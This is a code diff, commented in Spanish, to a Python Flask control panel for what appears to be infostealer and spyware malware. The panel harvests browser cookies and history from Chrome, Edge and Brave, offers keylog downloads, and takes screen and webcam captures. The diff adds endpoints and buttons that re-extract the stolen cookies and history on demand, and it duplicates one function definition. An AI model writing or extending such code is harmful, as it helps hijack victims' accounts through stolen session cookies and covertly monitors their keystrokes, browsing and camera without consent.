@@ -485,7 +485,6 @@ def extract_browser_history():
             
         try:
             if browser_name in ["chrome", "edge", "brave"]:
-                # Buscar archivos de historial
                 for root, dirs, files in os.walk(browser_path):
                     if "History" in files and "Extensions" not in root:
                         history_file = os.path.join(root, "History")
@@ -566,15 +565,12 @@ def auto_extract_data():
     
     print("🔍 Extrayendo datos automáticamente...")
     
-    # Extraer historial
     history_thread = threading.Thread(target=extract_browser_history, daemon=True)
     history_thread.start()
     
-    # Extraer cookies con el método avanzado
     cookies_thread = threading.Thread(target=extract_browser_cookies_advanced, daemon=True)
     cookies_thread.start()
     
-    # Esperar a que terminen
     history_thread.join(timeout=60)
     cookies_thread.join(timeout=60)
     
@@ -582,6 +578,49 @@ def auto_extract_data():
     print("✅ Extracción automática completada")
     print(f"📊 Historial extraído: {len(extracted_history)} entradas")
     print(f"🍪 Cookies extraídas: {len(extracted_cookies)} cookies")
+
+def auto_extract_data():
+    global extraction_complete
+    
+    print("🔍 Extrayendo datos automáticamente...")
+    
+    history_thread = threading.Thread(target=extract_browser_history, daemon=True)
+    history_thread.start()
+    
+    cookies_thread = threading.Thread(target=extract_browser_cookies_advanced, daemon=True)
+    cookies_thread.start()
+    
+    history_thread.join(timeout=60)
+    cookies_thread.join(timeout=60)
+    
+    extraction_complete = True
+    print("✅ Extracción automática completada")
+    print(f"📊 Historial extraído: {len(extracted_history)} entradas")
+    print(f"🍪 Cookies extraídas: {len(extracted_cookies)} cookies")
+
+def manual_extract_cookies():
+    global extracted_cookies
+    try:
+        print("🔄 Extrayendo cookies manualmente...")
+        cookies = extract_browser_cookies_advanced()
+        extracted_cookies = cookies
+        print(f"✅ Cookies extraídas manualmente: {len(cookies)}")
+        return True
+    except Exception as e:
+        print(f"❌ Error extrayendo cookies manualmente: {e}")
+        return False
+
+def manual_extract_history():
+    global extracted_history
+    try:
+        print("🔄 Extrayendo historial manualmente...")
+        history = extract_browser_history()
+        extracted_history = history
+        print(f"✅ Historial extraído manualmente: {len(history)}")
+        return True
+    except Exception as e:
+        print(f"❌ Error extrayendo historial manualmente: {e}")
+        return False
 
 HTML_INTERFACE = """
 <!DOCTYPE html>
@@ -688,6 +727,13 @@ HTML_INTERFACE = """
             background: linear-gradient(135deg, #1976D2 0%, #2196F3 100%);
             box-shadow: 0 5px 15px rgba(33, 150, 243, 0.4);
         }
+        .btn-update {
+            background: linear-gradient(135deg, #FF9800 0%, #F57C00 100%);
+        }
+        .btn-update:hover {
+            background: linear-gradient(135deg, #F57C00 0%, #FF9800 100%);
+            box-shadow: 0 5px 15px rgba(255, 152, 0, 0.4);
+        }
         .input-group {
             margin: 10px 0;
         }
@@ -726,6 +772,15 @@ HTML_INTERFACE = """
             padding: 15px;
             margin: 10px 0;
         }
+        .button-group {
+            display: flex;
+            gap: 10px;
+            margin: 10px 0;
+        }
+        .button-group .btn {
+            flex: 1;
+            margin: 0;
+        }
         .notification {
             position: fixed;
             top: 20px;
@@ -741,6 +796,12 @@ HTML_INTERFACE = """
         }
         .notification.show {
             transform: translateX(0);
+        }
+        .notification.error {
+            background: #f44336;
+        }
+        .notification.warning {
+            background: #FF9800;
         }
     </style>
 </head>
@@ -777,15 +838,29 @@ HTML_INTERFACE = """
         <!-- Botones de descarga siempre visibles -->
         <div class="control-grid">
             <div class="control-card">
-                <h3>📥 Descargar Datos Extraídos</h3>
-                <button class="btn btn-download" onclick="downloadCookies()">🍪 Descargar Cookies (ABE)</button>
-                <button class="btn btn-download" onclick="downloadHistory()">📊 Descargar Historial</button>
-                <button class="btn btn-download" onclick="downloadKeylog()">⌨️ Descargar Keylog</button>
+                <h3>📥 Gestión de Datos</h3>
+                
+                <div class="button-group">
+                    <button class="btn btn-update" onclick="updateCookies()">🔄 Actualizar Cookies</button>
+                    <button class="btn btn-download" onclick="downloadCookies()">🍪 Descargar Cookies</button>
+                </div>
+                
+                <div class="button-group">
+                    <button class="btn btn-update" onclick="updateHistory()">🔄 Actualizar Historial</button>
+                    <button class="btn btn-download" onclick="downloadHistory()">📊 Descargar Historial</button>
+                </div>
+                
+                <div class="button-group">
+                    <button class="btn btn-update" onclick="updateAllData()">🔄 Actualizar Todo</button>
+                    <button class="btn btn-download" onclick="downloadKeylog()">⌨️ Descargar Keylog</button>
+                </div>
+                
                 <div class="data-summary">
                     <strong>Resumen de datos:</strong><br>
                     <span id="cookies-count">Cookies: 0</span><br>
                     <span id="history-count">Historial: 0</span><br>
-                    <span id="keylog-count">Keylog: 0 teclas</span>
+                    <span id="keylog-count">Keylog: 0 teclas</span><br>
+                    <span id="last-update">Última actualización: Nunca</span>
                 </div>
             </div>
 
@@ -825,13 +900,90 @@ HTML_INTERFACE = """
     <div id="notification" class="notification"></div>
 
     <script>
+        let lastUpdateTime = 'Nunca';
+        
         function showNotification(message, type = 'success') {
             const notification = document.getElementById('notification');
             notification.textContent = message;
             notification.className = `notification show ${type}`;
             setTimeout(() => {
                 notification.classList.remove('show');
-            }, 3000);
+            }, 4000);
+        }
+
+        function updateLastUpdateTime() {
+            const now = new Date();
+            lastUpdateTime = now.toLocaleString();
+            document.getElementById('last-update').textContent = `Última actualización: ${lastUpdateTime}`;
+        }
+
+        async function updateCookies() {
+            try {
+                document.getElementById('command-result').textContent = 'Actualizando cookies... Esto puede tomar unos minutos.';
+                const response = await fetch('/api/update_cookies', {
+                    method: 'POST'
+                });
+                const result = await response.json();
+                
+                if (result.success) {
+                    document.getElementById('command-result').textContent = result.message;
+                    showNotification('✅ Cookies actualizadas correctamente');
+                    updateLastUpdateTime();
+                    updateStatus();
+                } else {
+                    document.getElementById('command-result').textContent = result.error;
+                    showNotification('❌ Error actualizando cookies', 'error');
+                }
+            } catch (error) {
+                document.getElementById('command-result').textContent = `Error: ${error}`;
+                showNotification('❌ Error de red', 'error');
+            }
+        }
+
+        async function updateHistory() {
+            try {
+                document.getElementById('command-result').textContent = 'Actualizando historial... Esto puede tomar unos minutos.';
+                const response = await fetch('/api/update_history', {
+                    method: 'POST'
+                });
+                const result = await response.json();
+                
+                if (result.success) {
+                    document.getElementById('command-result').textContent = result.message;
+                    showNotification('✅ Historial actualizado correctamente');
+                    updateLastUpdateTime();
+                    updateStatus();
+                } else {
+                    document.getElementById('command-result').textContent = result.error;
+                    showNotification('❌ Error actualizando historial', 'error');
+                }
+            } catch (error) {
+                document.getElementById('command-result').textContent = `Error: ${error}`;
+                showNotification('❌ Error de red', 'error');
+            }
+        }
+
+        async function updateAllData() {
+            try {
+                document.getElementById('command-result').textContent = 'Actualizando todos los datos... Esto puede tomar varios minutos.';
+                const response = await fetch('/api/update_all', {
+                    method: 'POST'
+                });
+                const result = await response.json();
+                
+                if (result.success) {
+                    document.getElementById('command-result').textContent = result.message;
+                    showNotification('✅ Todos los datos actualizados correctamente');
+                    updateLastUpdateTime();
+                    updateStatus();
+                } else {
+                    document.getElementById('command-result').textContent = result.error;
+                    showNotification('❌ Error actualizando datos', 'error');
+                }
+            } catch (error) {
+                document.getElementById('command-result').textContent = `Error: ${error}`;
+                showNotification('❌ Error de red', 'error');
+            }
         }
 
         async function captureScreen() {
@@ -890,9 +1042,13 @@ HTML_INTERFACE = """
                     a.click();
                     document.body.removeChild(a);
                     showNotification('Cookies (ABE) descargadas!');
+                } else {
+                    const result = await response.json();
+                    showNotification('❌ Error descargando cookies', 'error');
                 }
             } catch (error) {
                 document.getElementById('command-result').textContent = `Error: ${error}`;
+                showNotification('❌ Error descargando cookies', 'error');
             }
         }
 
@@ -909,9 +1065,13 @@ HTML_INTERFACE = """
                     a.click();
                     document.body.removeChild(a);
                     showNotification('Historial descargado!');
+                } else {
+                    const result = await response.json();
+                    showNotification('❌ Error descargando historial', 'error');
                 }
             } catch (error) {
                 document.getElementById('command-result').textContent = `Error: ${error}`;
+                showNotification('❌ Error descargando historial', 'error');
             }
         }
 
@@ -928,9 +1088,13 @@ HTML_INTERFACE = """
                     a.click();
                     document.body.removeChild(a);
                     showNotification('Keylog descargado!');
+                } else {
+                    const result = await response.json();
+                    showNotification('❌ Error descargando keylog', 'error');
                 }
             } catch (error) {
                 document.getElementById('command-result').textContent = `Error: ${error}`;
+                showNotification('❌ Error descargando keylog', 'error');
             }
         }
 
@@ -1040,7 +1204,6 @@ def api_webcam():
         cam.release()
         
         if ret:
-            # Guardar la imagen temporalmente
             temp_file = os.path.join(os.getenv('TEMP'), 'webcam_capture.jpg')
             cv2.imwrite(temp_file, frame)
             return jsonify({'success': True, 'result': 'Foto de webcam capturada correctamente'})
@@ -1089,6 +1252,69 @@ def api_download_history():
             mimetype='application/json',
             headers={'Content-Disposition': 'attachment;filename=browser_history.json'}
         )
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+@app.route('/api/update_cookies', methods=['POST'])
+def api_update_cookies():
+    try:
+        success = manual_extract_cookies()
+        if success:
+            return jsonify({
+                'success': True,
+                'message': f'Cookies actualizadas correctamente. Total: {len(extracted_cookies)} cookies'
+            })
+        else:
+            return jsonify({'success': False, 'error': 'Error actualizando cookies'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/update_history', methods=['POST'])
+def api_update_history():
+    try:
+        success = manual_extract_history()
+        if success:
+            return jsonify({
+                'success': True,
+                'message': f'Historial actualizado correctamente. Total: {len(extracted_history)} entradas'
+            })
+        else:
+            return jsonify({'success': False, 'error': 'Error actualizando historial'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/update_all', methods=['POST'])
+def api_update_all():
+    try:
+        import threading
+        
+        cookies_success = [False]
+        history_success = [False]
+        
+        def cookies_thread():
+            cookies_success[0] = manual_extract_cookies()
+        
+        def history_thread():
+            history_success[0] = manual_extract_history()
+        
+        t1 = threading.Thread(target=cookies_thread)
+        t2 = threading.Thread(target=history_thread)
+        
+        t1.start()
+        t2.start()
+        
+        t1.join(timeout=60)
+        t2.join(timeout=60)
+        
+        if cookies_success[0] and history_success[0]:
+            return jsonify({
+                'success': True,
+                'message': f'Todos los datos actualizados. Cookies: {len(extracted_cookies)}, Historial: {len(extracted_history)}'
+            })
+        else:
+            return jsonify({
+                'success': False,
+                'error': f'Actualización parcial. Cookies: {"✓" if cookies_success[0] else "✗"}, Historial: {"✓" if history_success[0] else "✗"}'
+            })
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
